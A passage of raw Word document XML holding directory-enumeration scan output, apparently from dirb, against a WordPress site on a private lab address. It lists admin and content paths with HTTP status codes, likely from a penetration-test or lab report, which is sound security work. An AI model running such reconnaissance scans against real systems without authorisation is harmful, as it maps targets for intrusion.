    <w:p w14:paraId="2A05BE2B" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-mail (CODE:500|SIZE:3004)                                                                                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395D3058" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-pass (CODE:200|SIZE:0)                                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471466B3" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-register (CODE:302|SIZE:0)                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B4CCD9" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-settings (CODE:500|SIZE:0)                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57238948" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-signup (CODE:302|SIZE:0)                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09567117" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-trackback (CODE:200|SIZE:135)                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543D4257" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/xmlrpc (CODE:200|SIZE:42)                                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D26EC48" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/xmlrpc.php (CODE:200|SIZE:42)                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6943567A" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57597BBB" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/javascript/jquery/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EECA6FA" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/javascript/jquery/jquery (CODE:200|SIZE:248235)                                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CE89D4" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/javascript/jquery/version (CODE:200|SIZE:5)                                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498A6F05" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED1E6F6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/index/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35964488" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CFF517" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Try using FineTunning: '-f')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FA4B79" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="312E2BD0" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-admin/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53538FA5" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/about (CODE:302|SIZE:0)                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47BA98EA" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/admin (CODE:302|SIZE:0)                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C891908" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12922173" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/comment (CODE:302|SIZE:0)                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B19EE94" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/credits (CODE:302|SIZE:0)                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE26746" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-admin/css/                                                                                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A0DB86" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/edit (CODE:302|SIZE:0)                                                                                                                                                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A125727" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/export (CODE:302|SIZE:0)                                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA66B34" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-admin/images/                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076B836F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/import (CODE:302|SIZE:0)                                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429DEF1F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-admin/includes/                                                                                                                                                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEB6223" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/index (CODE:302|SIZE:0)                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4420A571" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3377B9E4" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/install (CODE:200|SIZE:673)                                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13233181" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-admin/js/                                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482ED4E4" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/link (CODE:302|SIZE:0)                                                                                                                                                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A9FD0E" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-admin/maint/                                                                                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5DCDD6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/media (CODE:302|SIZE:0)                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CAE7D16" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/menu (CODE:500|SIZE:0)                                                                                                                                                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D016F83" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/moderation (CODE:302|SIZE:0)                                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1FC91B" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-admin/network/                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D730CD1" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/options (CODE:302|SIZE:0)                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BF7915" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/plugins (CODE:302|SIZE:0)                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7994D538" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/post (CODE:302|SIZE:0)                                                                                                                                                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC4C731" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/profile (CODE:302|SIZE:0)                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611A9AC2" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/themes (CODE:302|SIZE:0)                                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AFFD43" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/tools (CODE:302|SIZE:0)                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E93C5AF" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/update (CODE:302|SIZE:0)                                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0613BC52" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/upgrade (CODE:302|SIZE:806)                                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2C3F13" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/upload (CODE:302|SIZE:0)                                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427C98F7" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-admin/user/                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41050622" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/users (CODE:302|SIZE:0)                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C92E59" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/widgets (CODE:302|SIZE:0)                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59041107" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0E2DC3" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-content/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FE3AC1" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/index (CODE:200|SIZE:0)                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3220B855" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                                                                                                                                  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4C73E4" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-content/languages/                                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C06B198" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-content/plugins/                                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D7DDCC" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-content/themes/                                                                                                                                                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F64C330" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A0C774" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
